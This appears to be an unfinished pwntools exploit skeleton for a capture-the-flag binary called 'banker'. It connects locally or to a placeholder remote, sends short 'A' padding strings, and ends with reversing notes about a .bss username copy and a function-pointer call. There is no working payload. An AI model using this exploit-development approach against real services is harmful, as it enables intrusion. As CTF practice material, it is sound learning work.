#!/usr/bin/env python3

from pwn import *

exe = ELF("./banker")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    r.send("A"*0xd)
    r.send("A"*9)

    r.interactive()


if __name__ == "__main__":
    main()
'''
weird function duplicates username after itself in .bss, and returns pointer to that place

interesting function that calls function pointer
'''